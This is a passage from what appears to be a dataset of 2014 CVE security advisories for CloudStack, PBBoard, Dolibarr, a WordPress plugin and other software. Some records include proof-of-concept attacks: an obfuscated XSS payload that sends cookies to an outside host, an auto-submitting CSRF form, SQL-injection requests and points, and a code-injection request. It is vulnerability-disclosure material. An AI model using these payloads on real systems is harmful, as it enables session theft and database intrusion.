Crz7kHpcpYSn15u7vploGOki/G0sqpMVL9UwkK/F5vxRkMWxBjqvCzXudDXBvYVJ
gnSJGw0QB6roJqHx3yf3x91YE8m69axiFTE8dAUz1IfTsbEgc2oUfnO+crWPyWh7
IHx8gIfN/3Uck/6gLPse63rtKB+jI7/i4xJbm0FIbOnodzkJP1GDy9U3UsEbleSW
kKV884YFogi1iyfuOhrqCGWatQybpHlM/VyycH3NvzpsDFwVCYrnaQ/jpfKS1rlz
dWvSYp6b43Nui30hm+kv
=PZkK
-----END PGP SIGNATURE-----"
5748,[CVE-2014-7807] Apache CloudStack unauthenticated LDAP binds,,CVE-2014-7807,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2014-7807: Apache CloudStack unauthenticated LDAP binds
CVSS:
7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P
Vendors:
The Apache Software Foundation
Citrix, Inc.
Versions Afffected:
Apache CloudStack 4.3, 4.4
Description:
Apache CloudStack may be configured to authenticate LDAP users.
When so configured, it performs a simple LDAP bind with the name
and password provided by a user. Simple LDAP binds are defined
with three mechanisms (RFC 4513): 1) username and password; 2)
unauthenticated if only a username is specified; and 3) anonymous
if neither username or password is specified. Currently, Apache
CloudStack does not check if the password was provided which could
allow an attacker to bind as an unauthenticated user.
Mitigation:
Users of Apache CloudStack 4.4 and derivatives should update to the
latest version (4.4.2)
An updated release for Apache CloudStack 4.3.2 is in testing. Until
that is released, we recommend following the mitigation below:
By default, many LDAP servers are not configured to allow unauthenticated
binds. If the LDAP server in use allow this behaviour, a potential
interim solution would be to consider disabling unauthenticated
binds.
Credit:
This issue was identified by the Citrix Security Team.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
Comment: GPGTools - http://gpgtools.org
iQIcBAEBCgAGBQJUhgUCAAoJEOom9N0pCN7SOQMQAKyBuhg25u3FcVOU5XMdGGpT
2kSVFoLFR74ObI8bdr3HP+2LdLf/Go9QBBrWlZ034FUj6OV0Ct5o8TNB6AHbv0qF
Ar4N05JoGtPaDCe9sWV/+ykOJH8snQjnYwVFrLZlLw8Y/JUQ+I1yJBksw8a2/hT2
vmYgYiAQyrEMMk4bhBBlEyaJFMhuMtKtgUqLDW8wmlhkt2acZMt/0BKxDwAO8o7m
6ypepPCmkPHUpD50tfcCI+K4ib/C5EOn40n4orM97/JHZLsCyhz5nk36eQMOQQz2
fJlaA04fQSV4Cv7c+S0LPh5e4e6TPSrOW3O4/V2dkjK/GgP8kUoo7ivyjIw6d2oJ
Z5vqqgxrmgwDjH58YfVu3tyVuDlOFTZfCLkhdoXMxHfMLYYKeXkffRli9XabxrE+
AkVoXaQAumf8IzTLVSQztV18jC79kvEeCV0pFYOjb/X/gShemruqmCWVDulj1ax6
tzoP+Bm2mQRyrRClY37R+q3cQ2z6eNAC/vAoYzhYBN1o63MYneLYDADhyE6YIGz0
LTbDDGFn0WVdFDrqworHdYDIMW7HQFMNtsQuueeP7LBldsgyTmjmBMp+S3Tq27UT
RaVgp3n9ZUPdzj/i1vvJBrATKUNmv1GDoy+C1GPNx423nEOe7dFkMJARlcbf5Pml
03DX+ot4Xan0P5HXPT+r
=QqOf
-----END PGP SIGNATURE-----"
5765,CVE-2014-9215 - SQL Injection in PBBoard CMS,,CVE-2014-9215,"Vulnerability title: SQL Injection in PBBoard CMS
CVE: CVE-2014-9215
CMS: PBBoard
Vendor: Power bulletin board - http://www.pbboard.info/
Product: http://sourceforge.net/projects/pbboard/files/PBBoard_v3.0.1/PBBoard_v3.0.1.zip/download
Affected version: Version 3.0.1 (updated on 13/09/2014) and before.
Fixed version: Version 3.0.1 (updated on 28/11/2014)
Google dork: intext:Powered By PBBoard
Reported by: Tran Dinh Tien - tien.d.tran itas vn
Credits to ITAS Team - www.itas.vn
:: DESCRITION ::
Multiple SQL injection vulnerabilities has been found and confirmed within the software as an anonymous user. A successful attack could allow an anonymous attacker to access information such as username and password hashes that are stored in the database. The following URLs and parameters have been confirmed to suffer from SQL injection.
:: DETAILS :: Attack vector
Link 1:
POST /index.php?page=register&checkemail=1 HTTP/1.1
Host: target.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://target.org/index.php?page=register&index=1&agree=1
Content-Length: 29
Cookie: PowerBB_lastvisit=1417086736; PHPSESSID=j0f7fuju2tu2ip7jrlgq6m56k4
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
email=<SQL Injection Here>&ajax=1
Link 2:
POST /index.php?page=forget&start=1 HTTP/1.1
Host: target.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target.org/index.php?page=forget&index=1
Cookie: PowerBB_lastvisit=1417086736; PHPSESSID=j0f7fuju2tu2ip7jrlgq6m56k4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
code=0ae4e&email=<SQL Injection Here>&submit_forget=Save
link 3:
POST /index.php?page=forget&send_active_code=1 HTTP/1.1
Host: target.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target.org/index.php?page=forget&active_member=1&send_active_code=1
Cookie: PowerBB_lastvisit=1417086736; PHPSESSID=j0f7fuju2tu2ip7jrlgq6m56k4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
code=13709&email=<SQL Injection Here>&submit_active_code=Save
:: CODE DETAIL ::
- Vulnerable parameter: email
- Vulnerable file: includes/functions.class.php
- Vulnerable function: CheckEmail($email)
- Vulnerable code:
function CheckEmail($email)
{
return preg_match('#^[a-z0-9.!#$%&'*+-/=?^_`{|}~]+@([0-9.]+|([^s'""<>@,;]+.+[a-z]{2,6}))$#si', $email) ? true : false;
}
- Fix code:
function CheckEmail($email)
{
// First, we check that there's one @ symbol, and that the lengths are right
if (!preg_match(""/^[^@]{1,64}@[^@]{1,255}$/"", $email)) {
// Email invalid because wrong number of characters in one section, or wrong number of @ symbols.
return false;
}
if (@strstr($email,'""')
or @strstr($email,""'"")
or @strstr($email,'>')
or @strstr($email,'<')
or @strstr($email,'*')
or @strstr($email,'%')
or @strstr($email,'$')
or @strstr($email,'#')
or @strstr($email,'+')
or @strstr($email,'^')
or @strstr($email,'&')
or @strstr($email,',')
or @strstr($email,'~')
or @strstr($email,'!')
or @strstr($email,'{')
or @strstr($email,'}')
or @strstr($email,'(')
or @strstr($email,')')
or @strstr($email,'/'))
{
return false;
}
// Split it into sections to make life easier
$email_array = explode(""@"", $email);
$local_array = explode(""."", $email_array[0]);
for ($i = 0; $i < sizeof($local_array); $i++) {
if (!preg_match(""/^(([A-Za-z0-9!#$%&'*+/=?^_`{|}~-][A-Za-z0-9!#$%&'*+/=?^_`{|}~.-]{0,63})|(""[^(\|"")]{0,62}""))$/"", $local_array[$i])) {
return false;
}
}
if (!preg_match(""/^[?[0-9.]+]?$/"", $email_array[1])) { // Check if domain is IP. If not, it should be valid domain name
$domain_array = explode(""."", $email_array[1]);
if (sizeof($domain_array) < 2) {
return false; // Not enough parts to domain
}
for ($i = 0; $i < sizeof($domain_array); $i++) {
if (!preg_match(""/^(([A-Za-z0-9][A-Za-z0-9-]{0,61}[A-Za-z0-9])|([A-Za-z0-9]+))$/"", $domain_array[$i])) {
return false;
}
}
}
return true;
}

:: SOLUTION ::
Version 3.0.1 (updated on 28/11/2014)
:: DISCLOSURE ::
- 11/27/2014: Inform the vendor
- 11/28/2014: Vendor confirmed
- 11/28/2014: Vendor releases patch
- 12/01/2014: ITAS Team publishes information
::COPYRIGHT::
Copyright (c) ITAS CORP 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of ITAS CORP (www.itas.vn).
:: DISCLAIMER ::
THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK.
:: REFERENCE ::
- http://www.itas.vn/news/ITAS-Team-discovered-SQL-Injection-in-PBBoard-CMS-68.html
- https://www.youtube.com/watch?v=AQiGvH5xrJg"
5774,CVE-2014-9129: XSS and CSRF in CM Download Manager plugin for WordPress,,CVE-2014-9129,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Product: WordPress plugin cm-download-manager
Plugin page: https://wordpress.org/plugins/cm-download-manager/
Vendor: CreativeMindsSolutions http://cminds.com/
Vulnerability Type: CWE-79: Cross-site scripting
Vulnerable Versions: 2.0.6 and below
Fixed Version: 2.0.7
Solution Status: Fixed by Vendor
Vendor Notification: 2014-11-27
Public Disclosure: 2014-12-02
CVE Reference: N/A. Only assigned for CSRF
Criticality: Low
Vulnerability details:
CM Download Manager plugin for WordPress contains a flaw that allows a stored
cross-site scripting (XSS) attack. This flaw exists because the
/wp-admin/admin.php script does not validate input to the 'addons_title' POST
parameter before returning it to users. This allows an authenticated remote
attacker to create a specially crafted request that would execute arbitrary
script code in a user's browser session within the trust relationship between
their browser and the server.
Root cause:
The software incorrectly neutralizes user-controllable input before it is placed
in output that is used as a web page that is served to authenticated users.
Proof-of-concept:
Insert following code to CM Downloads -> Settings -> ""Downloads listing title""
field with CSRF attack.
<script>var foo = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 110,
101, 119, 32, 73, 109, 97, 103, 101, 40, 41, 46, 115, 114, 99, 61, 34, 104, 116,
116, 112, 58, 47, 47, 98, 117, 103, 115, 46, 102, 105, 47, 99, 111, 111, 107,
105, 101, 46, 112, 104, 112, 63, 105, 100, 61, 34, 43, 100, 111, 99, 117, 109,
101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 60, 47, 115, 99, 114, 105,
112, 116, 62);document.write(foo);</script>
- ---------------
Product: WordPress plugin cm-download-manager
Plugin page: https://wordpress.org/plugins/cm-download-manager/
Vendor: CreativeMindsSolutions http://cminds.com/
Vulnerability Type: CWE-352: Cross-Site Request Forgery
Vulnerable Versions: 2.0.6 and below
Fixed Version: 2.0.7
Solution Status: Fixed by Vendor
Vendor Notification: 2014-11-27
Public Disclosure: 2014-12-02
CVE Reference: CVE-2014-9129
Criticality: Low
Vulnerability details:
CM Download Manager plugin for WordPress contains a flaw on the
CMDM_admin_settings page as HTTP requests to /wp-admin/admin.php do not
require multiple steps, explicit confirmation, or a unique token when performing
sensitive actions. By tricking authenticated user into following a specially
crafted link, a context-dependent attacker can perform a CSRF attack causing the
victim to insert and execute arbitrary script code.
Root cause:
The web application does not sufficiently verify whether a well-formed, valid,
consistent request was intentionally provided by the user who submitted the
request.
Proof-of-concept:
<html><body><h3>https://example.org/wp-admin/admin.php?page=CMDM_admin_settings</h3>
<form id=""f1"" method=""POST""
action=""https://example.com/wp-admin/admin.php?page=CMDM_admin_settings"">
<table><input type=""text"" name=""addons_title"" value=""XSS""></table></form>
<script type=""text/javascript"">document.getElementById(""f1"").submit();</script>
</body></html>
Notes:
Other pages and/or parameters are also possibly insecure (not tested). Suggested
to do a proper security audit for their software. Vendor did not mention
security fix or CVE in ChangeLog even it was discussed several times. References
below.
Cross-site scripting:
http://cwe.mitre.org/data/definitions/79.html
https://scapsync.com/cwe/CWE-79
https://en.wikipedia.org/wiki/Cross-site_scripting
Cross-Site Request Forgery:
http://cwe.mitre.org/data/definitions/352.html
https://scapsync.com/cwe/CWE-352
https://en.wikipedia.org/wiki/Cross-site_request_forgery
- ---
Henri Salo
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iEYEARECAAYFAlR96QIACgkQXf6hBi6kbk8peQCgtWgwrqs7ahsAw30Ndnu70N7/
l98An1m+MqJ7xJ8+VcPbMxo72i1Xs2oT
=bUVi
-----END PGP SIGNATURE-----"
5780,CVE-2014-3809: Reflected XSS in Alcatel Lucent 1830 PSS-32/16/4,,CVE-2014-3809,"#############################################################
#
# SWISSCOM CSIRT ADVISORY - http://www.swisscom.com/security
#
#############################################################
#
# CVE ID: CVE-2014-3809
# Product: 1830 Photonic Service Switch PSS-32/16/4
# Vendor: Alcatel-Lucent
# Subject: Reflected Cross-site Scripting - XSS
# Effect: Remotely exploitable
# Author: Stephan Rickauer (stephan.rickauer _at_ swisscom.com)
# Date: December 1st 2014
#
#############################################################
Introduction:
-------------
Swisscom CSIRT discovered a security flaw in the management interface
of the Alcatel Lucent 1830 Photonic Service Switch series.
Vulnerable:
-----------
All Switches of Release 6.0 or lower are vulnerable.
Patches:
--------
None.
Description:
------------
The management interface of the 1830 Photonic Switch series is vulnerable
to reflected cross-site scripting, since user input is not properly encoded
on output. Exploiting this vulnerability will lead to so-called cross-site
scripting (XSS) and allows the impersonation of logged-in admin users.
Additionally, the myurl-Parameter accepts non-local web addresses, which
can be abused to redirect victims to arbitrary web sites.
Attack vector:
--------------
https://xx.xx.xx.xx/menu/pop.html?myurl=);<script>alert('xss')</script>
Statement Vendor:
-----------------
""The vulnerability is assessed at no risk. We will evaluate if/when we
will add the best practice of validating all inputs in WebUI tasks, but
this is not considered high priority for the roadmap.""
Milestones:
-----------
May 21st 2014 Vulnerability discovered
May 21st 2014 CVE requested
June 13th 2014 Vendor contact established and provided with technical details
June 16th 2014 Vendor acknowledged issue (Psirt.Security at alcatel-lucent.com)
Aug. 28th 2014 Vendor update requested
Okt. 1st 2014 Vendor update requested
Dec. 1st 2014 Vendor update requested
Dec. 1st 2014 Vendor assess XSS not to be an issue
Dec. 1st 2014 Public release of advisory"
5786,WordPress <=4.0 Denial of Service Exploit (CVE-2014-9034),,CVE-2014-9034,"author details: John M. (john secureli com)
homepage details: SECURELI.com
Description:
CVE-2014-9034 was published recently, highlighting an issue that �allows remote attackers to cause a denial of service (CPU consumption) via a long password that is improperly handled during hashing� due to phpass usage.
After reviewing the vulnerability, I have developed a proof-of-concept that successfully performs a denial of service attack against wp-includes/class-phpass.php in the affected version numbers:
before 3.7.5
3.8.x before 3.8.5
3.9.x before 3.9.3
4.x before 4.0.1
There is no other working code published out in the security world that allows replicating the denial of service code, so this is an exclusive world premier. :)
The proof of concept is developed in PHP and is available for download here:
http://secureli.com/wp-content/uploads/2014/11/secureli.com-wordpressed.php_.txt
-John"
5802,CVE-2014-5439 - Root shell on Sniffit [with exploit],,CVE-2014-5439,"CVE-2014-5439 - Root shell on Sniffit
Sniffit is a packet sniffer and monitoring tool.
The attacker can create a specially-crafted sniffit configuration file, which is able
to bypass all three protection mechanisms:
- Non-eXecutable bit NX
- Stack Smashing Protector SSP
- Address Space Layout Randomisation ASLR
And execute arbitrary code with root privileges.
Exploit, fix and discussion in:
http://hmarco.org/bugs/CVE-2014-5439-sniffit_0.3.7-stack-buffer-overflow.html
Regards,
Hector Marco.
http://hmarco.org
Cybersecurity researcher at:
http://cybersecurity.upv.es/"
5817,CVE-2014-8419 - CodeMeter Weak Service Permissions,,CVE-2014-8419,"CodeMeter Weak Service Permissions
Vendor Website : http://www.codemeter.com
INDEX
---------------------------------------
1. Background
2. Description
3. Affected Products
4. Vulnerability
5. Solution
6. Credit
7. Disclosure Timeline
8. CVE
1. BACKGROUND
---------------------------------------
CodeMeter from Wibu-Systems provides maximum protection against software piracy and is bundled with multiple open-source products.
2. DESCRIPTION
---------------------------------------
When the CodeMeter runtime is installed on a Microsoft Windows operating system, it creates a service named ""codemeter.exe"".
A local privilege escalation vulnerability has been identified in the codemeter.exe Windows service. When installed with the default settings, this service allows Read/Write access to any user, meaning any user can modify the location of the binary executed by the service with SYSTEM privileges.
It should be noted that this vulnerability is not present in the most recent version of Codemeter runtime (currently 5.20).
3. AFFECTED PRODUCTS
---------------------------------------
Only the following versions have been confirmed vulnerable:
CodeMeter Runtime 4.50b
CodeMeter Runtime 4.40
CodeMeter Runtime 4.20b
4. VULNERABILITIES
---------------------------------------
4.1 codemeter.exe
5. SOLUTION
---------------------------------------
Vendor contacted and approved for disclosure as most recent version is not vulnerable.
6. CREDIT
---------------------------------------
This vulnerability was discovered by Andrew Smith and Matt Smith of Sword & Shield Enterprise Security.
7. DISCLOSURE TIMELINE
---------------------------------------
7-16-2014 - Vulnerability Discovered
8-11-2014 - Vendor Informed
11-20-2014 - Public Disclosure
8. CVE
---------------------------------------
CVE-2014-8419"
5838,CVE-2014-8877 - Code Injection in Wordpress CM Download Manager plugin,,CVE-2014-8877,"Vulnerability title: Code Injection in Wordpress CM Download Manager plugin
CVE: CVE-2014-8877
Plugin: CM Download Manager plugin
Vendor: CreativeMinds - https://www.cminds.com/
Product: https://wordpress.org/plugins/cm-download-manager/
Affected version: 2.0.0 and previous version
Fixed version: 2.0.4
Google dork: inurl:cmdownloads
Reported by: Phi Le Ngoc - phi.n.le itas vn
Credits to ITAS Team - www.itas.vn
::DESCRITION::
The code injection vulnerability has been found and confirmed within the software as an anonymous user. A successful attack could allow an anonymous attacker gains full control of the application and the ability to use any operating system functions that are available to the scripting environment.
GET /cmdownloads/?CMDsearch="".phpinfo()."" HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: _ga=GA1.2.1698795018.1415614778; _gat=1; PHPSESSID=okt6c51s4esif2qjq451ati7m6; cmdm_disclaimer=Y; JSB=1415614988879
Connection: keep-alive
Vulnerable file:/wp-content/plugins/cm-download-manager/lib/controllers/CmdownloadController.php
Vulnerable code: (Line: 130 -> 158)
public static function alterSearchQuery($search, $query)
{
if( ( (isset($query->query_vars['post_type']) && $query->query_vars['post_type'] == CMDM_GroupDownloadPage::POST_TYPE) && (!isset($query->query_vars['widget']) || $query->query_vars['widget'] !== true) ) && !$query->is_single && !$query->is_404 && !$query->is_author && isset($_GET['CMDsearch']) )
{
global $wpdb;
$search_term = $_GET['CMDsearch'];
if( !empty($search_term) )
{
$search = '';
$query->is_search = true;
// added slashes screw with quote grouping when done early, so done later
$search_term = stripslashes($search_term);
preg_match_all('/"".*?(""|$)|((?<=[ "",+])|^)[^ "",+]+/', $search_term, $matches);
$terms = array_map('_search_terms_tidy', $matches[0]);
$n = '%';
$searchand = ' AND ';
foreach((array) $terms as $term)
{
$term = esc_sql(like_escape($term));
$search .= ""{$searchand}(($wpdb->posts.post_title LIKE '{$n}{$term}{$n}') OR ($wpdb->posts.post_content LIKE '{$n}{$term}{$n}'))"";
}
add_filter('get_search_query', create_function('$q', 'return ""' . $search_term . '"";'), 99, 1);
remove_filter('posts_request', 'relevanssi_prevent_default_request');
remove_filter('the_posts', 'relevanssi_query');
}
}
return $search;
}
::SOLUTION::
Update to version 2.0.4
::DISCLOSURE::
2014-11-08 initial vendor contact
2014-11-10 vendor response
2014-11-10 vendor confirmed
2014-11-11 vendor release patch
2014-11-14 public disclosure
::REFERENCE::
https://downloadsmanager.cminds.com/release-notes/
http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en
::COPYRIGHT::
Copyright (c) ITAS CORP 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of ITAS CORP.
::DISCLAIMER::
THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK."
5843,CVE-2014-7137 - Multiple SQL Injections in Dolibarr ERP & CRM,,CVE-2014-7137,"Vulnerability title: Multiple SQL Injections in Dolibarr ERP & CRM
CVE: CVE-2014-7137
Vendor: Dolibarr ERP & CRM
Product: Dolibarr ERP & CRM
Affected version: 3.5.3
Fixed version: 3.6.1
Reported by: Jerzy Kramarz
Details:
SQL injection has been found and confirmed within the software as an authenticated user. A successful attack could allow an authenticated attacker to access information such as usernames and password hashes that are stored in the database.
The following URL and parameters have been confirmed to suffer from various forms of SQL injections:
http://[IP]/dolibarr/product/stock/fiche.php?action=edit&id=1<SQL Injection>
http://[IP]/dolibarr/product/stock/liste.php?sref=55<SQL Injection>&token=142abe4c1c4b84c3d0c81533c3840cc4&sall=55
http://[IP]/dolibarr/product/stock/liste.php?sref=555-555-0199 example com&token=142abe4c1c4b84c3d0c81533c3840cc4&sall=55<SQL Injection>
http://[IP]/dolibarr/projet/element.php?ref=PJ1407<SQL Injection>
http://[IP]/dolibarr/projet/tasks/index.php?search_project=5<SQL Injection>bqve&button_search.x=1&button_search.y=1&mode=
http://[IP]/dolibarr/compta/prelevement/demandes.php?search_societe=5<SQL Injection>&search_facture=5&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/comm/mailing/liste.php?sref=5<SQL Injection>&sall=5&x=1&y=1
http://[IP]/dolibarr/comm/mailing/liste.php?sref=5&sall=5<SQL Injection>&x=1&y=1
http://[IP]/dolibarr/compta/sociales/index.php?search_label=5<SQL Injection>&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/compta/paiement/cheque/liste.php?sortfield=bc.number<SQL Injection>&sortorder=asc&begin=&
http://[IP]/dolibarr/compta/paiement/cheque/liste.php?sortfield=bc.number&sortorder=asc<SQL Injection>&begin=&
http://[IP]/dolibarr/compta/prelevement/rejets.php?sortfield=p.ref<SQL Injection>&sortorder=asc&begin=&
http://[IP]/dolibarr/compta/prelevement/rejets.php?sortfield=p.ref&sortorder=asc<SQL Injection>&begin=&
http://[IP]/dolibarr/product/liste.php?sortfield=p.ref&sortorder=asc&begin=&sref=&snom=&sall=&tosell=<SQL Injection>&tobuy=&type=&
http://[IP]/dolibarr/product/liste.php?sortfield=p.ref&sortorder=asc&begin=&sref=&snom=&sall=&tosell=&tobuy=<SQL Injection>&type=&
http://[IP]/dolibarr/product/reassort.php?toolowstock=on&snom=5&sortorder=ASC&sref=5&token=d638ca7f80a7ad68e2cf327a75f954a6&button_search.x=1&button_search.y=1&type=&search_categ=4<SQL Injection>&sortfield=stock_physique
http://[IP]/dolibarr/product/liste.php?sortfield=p.ref&sortorder=asc&begin=&sref=&snom=&sall=&tosell=1<SQL Injection>&tobuy=&type=&
http://[IP]/dolibarr/product/liste.php?sortfield=p.ref&sortorder=asc&begin=&sref=&snom=&sall=&tosell=1&tobuy=<SQL Injection>&type=&
http://[IP]/dolibarr/product/stats/commande_fournisseur.php?sortfield=c.rowid<SQL Injection>&sortorder=asc&begin=&id=2
http://[IP]/dolibarr/product/stats/commande_fournisseur.php?sortfield=c.rowid&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/product/stats/contrat.php?sortfield=c.rowid<SQL Injection>&sortorder=asc&begin=&id=2
http://[IP]/dolibarr/product/stats/contrat.php?sortfield=c.rowid'&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/product/stats/facture_fournisseur.php?sortfield=s.rowid<SQL Injection>&sortorder=asc&begin=&id=2
http://[IP]/dolibarr/product/stats/facture_fournisseur.php?sortfield=s.rowid&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/product/stats/propal.php?sortfield=p.rowid<SQL Injection>&sortorder=asc&begin=&id=2
http://[IP]/dolibarr/product/stats/propal.php?sortfield=p.rowid&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/product/stock/fiche.php?id=0<SQL Injection>
http://[IP]/dolibarr/product/stock/info.php?id=0<SQL Injection>
http://[IP]/dolibarr/product/stock/liste.phpsortfield=e.label&sortorder=asc<SQL Injection>&begin=&
http://[IP]/dolibarr/product/stock/liste.php?sortfield=e.label<SQL Injection>&sortorder=asc&begin=&
http://[IP]/dolibarr/product/reassort.php?toolowstock=on&snom=5&sortorder=ASC&sref=5<SQL Injection>&token=d638ca7f80a7ad68e2cf327a75f954a6&button_search.x=1&button_search.y=1&type=&search_categ=4&sortfield=stock_physique
http://[IP]/dolibarr/product/stock/massstockmove.php?productid=1<SQL Injection>&token=9d491e55462571d39390bd136f4f50da&id_tw=-1&action=addline&qty=5&id_sw=-1&addline=%D8%B1%D8%AA%D8%AE%D8%A7&search_productid=5
http://[IP]/dolibarr/product/stock/replenishorders.php?sortfield=cf.ref&sortorder=asc<SQL Injection>&begin=&
http://[IP]/dolibarr/product/stock/replenishorders.php?sortfield=cf.ref<SQL Injection>&sortorder=asc&begin=&
http://[IP]/dolibarr/projet/contact.php?id=1&action=deletecontact&lineid=21<SQL Injection>
http://[IP]/dolibarr/projet/contact.php?id=1&action=swapstatut&ligne=21<SQL Injection>
http://[IP]/dolibarr/projet/tasks/contact.php?id=1&action=swapstatut&ligne=21<SQL Injection>
http://[IP]/dolibarr/compta/recap-compta.php?socid=1<SQL Injection>
http://[IP]/dolibarr/holiday/index.php?mainmenu=holiday&id=1<SQL Injection>
http://[IP]/dolibarr/projet/tasks/contact.php?id=2&source=internal&token=acff06ed1720e3ec66a16918dcee2bfd&action=addcontact&type=181&contactid=2<SQL Injection>&withproject=1
http://[IP]/dolibarr/product/stock/fiche.php?id=1<SQL Injection>
http://[IP]/dolibarr/projet/contact.php?ref=PJ1407-0002<SQL Injection>
http://[IP]/dolibarr/projet/ganttview.php?ref=PJ1407-0002<SQL Injection>
http://[IP]/dolibarr/product/stock/fiche.php?id=1<SQL Injection>
http://[IP]/dolibarr/projet/note.php?ref=PJ1407-0002<SQL Injection>
http://[IP]/dolibarr/projet/tasks/contact.php?project_ref=PJ1407-0002<SQL Injection>&withproject=1
http://[IP]/dolibarr/projet/tasks.php?ref=PJ1407-0002<SQL Injection>&mode=mine
http://[IP]/dolibarr/projet/tasks/note.php?project_ref=PJ1407-0002<SQL Injection>&withproject=1
http://[IP]/dolibarr/contact/info.php?id=2<SQL Injection>&optioncss=print
http://[IP]/dolibarr/societe/commerciaux.php?socid=117260852<SQL Injection>&optioncss=print
http://[IP]/dolibarr/compta/dons/liste.php?statut=2<SQL Injection>
http://[IP]/dolibarr/societe/rib.php?socid=1<SQL Injection>&optioncss=print
http://[IP]/dolibarr/adherents/liste.php?leftmenu=members&statut=1<SQL Injection>&filter=outofdate&idmenu=9431&mainmenu=members
http://[IP]/dolibarr/product/reassort.php?sortfield=p.ref&sortorder=asc&begin=&tosell=43<SQL Injection>&tobuy=&type=0&fourn_id=&snom=&sref=&
http://[IP]/dolibarr/product/reassort.php?sortfield=p.ref&sortorder=asc&begin=&tosell=&tobuy=3<SQL Injection>&type=0&fourn_id=&snom=&sref=&
http://[IP]/dolhttp://[IP]/dolibarr/product/index.php?leftmenu=product&type=0<SQL Injection>&idmenu=2819&mainmenu=products
http://[IP]/dolibarr/product/stats/facture.php?sortfield=s.rowid<SQL Injection>&sortorder=asc&begin=&id=2
http://[IP]/dolibarr/product/stats/facture.php?sortfield=s.rowid&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/user/index.php?sortfield=u.login&sortorder=asc&begin=search_user=&sall=&search_statut=<SQL Injection>&
http://[IP]/dolibarr/compta/bank/fiche.php?id=<SQL Injection>
http://[IP]/dolibarr/compta/prelevement/liste.php?search_code=5<SQL Injection>&search_societe=5&search_ligne=5&search_bon=5&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/compta/prelevement/liste.php?search_code=5&search_societe=5<SQL Injection>&search_ligne=5&search_bon=5&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/compta/prelevement/liste.php?search_code=5&search_societe=5&search_ligne=5<SQL Injection>&search_bon=5&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/compta/prelevement/liste.php?search_code=5&search_societe=5&search_ligne=5&search_bon=5<SQL Injection>&button_search.x=1&button_search.y=1
http://[IP]/dolibarr/compta/prelevement/bons.php?sortfield=p.ref&sortorder=asc<SQL Injection>&begin=&
http://[IP]/dolibarr/compta/prelevement/bons.php?sortfield=p.ref<SQL Injection>&sortorder=asc&begin=&
http://[IP]/dolibarr/product/stats/commande.php?sortfield=c.rowid&sortorder=asc<SQL Injection>&begin=&id=2
http://[IP]/dolibarr/product/stats/commande.php?sortfield=c.rowid<SQL Injection>&sortorder=asc&begin=&id=2
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-7137/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
